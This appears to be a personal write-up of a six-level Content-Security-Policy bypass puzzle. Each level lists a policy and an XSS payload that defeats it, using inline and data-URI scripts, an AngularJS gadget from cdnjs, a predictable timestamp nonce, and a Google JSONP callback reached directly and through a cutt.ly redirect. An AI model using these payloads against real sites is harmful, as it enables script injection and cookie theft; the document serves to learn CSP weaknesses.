# CSP Puzzle

**Level 1**
default-src 'self'; script-src 'unsafe-inline'
`<script>alert('xss')</script>`

**Level 2**
default-src 'self'; script-src data:
`<script src="data:;base64,YWxlcnQoInhzcyIp"></script>`

**Level 3**
default-src 'self'; script-src https://cdnjs.cloudflare.com/
Would be possible to use a library on cloudflare that uses eval (or setTimeout with string param). Had to use solution: 
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.7.8/angular.js"></script> <input type=text ng-app id=p ng-focus=$event.view.alert("Hacked")>

**Level 4**
default-src 'self'; script-src 'nonce-MDQuMDMuMjAyMy8xMToyNg=='
<script nonce="MDQuMDMuMjAyMy8xMjo0NA==">alert('xss')</script>   (nonce is the base64 encoded current time in the following format: "04.03.2023/12:44")

**Level 5**
default-src 'self'; script-src https://accounts.google.com
<script src="https://accounts.google.com/o/oauth2/revoke?callback=alert(document.cookie);"></script>
JSONP -> is a trick to allow loading data from cross origin resources. It demands a callback function to be passed that is to be executed (here an alert)

**Level 6**
default-src 'self'; script-src https://cutt.ly https://accounts.google.com/secure/
<script src="https://cutt.ly/VedoLP4"></script>
cutt.ly site will redirect to anotto https://accounts.google.com/secure/ (status code 301) which in this case is again a JSONP "https://accounts.google.com/o/oauth2/revoke?callback=alert(document.cookie);" that executes the js code

My learnings: CSP is not easy, especially when scripts from other sources have to be allowed.  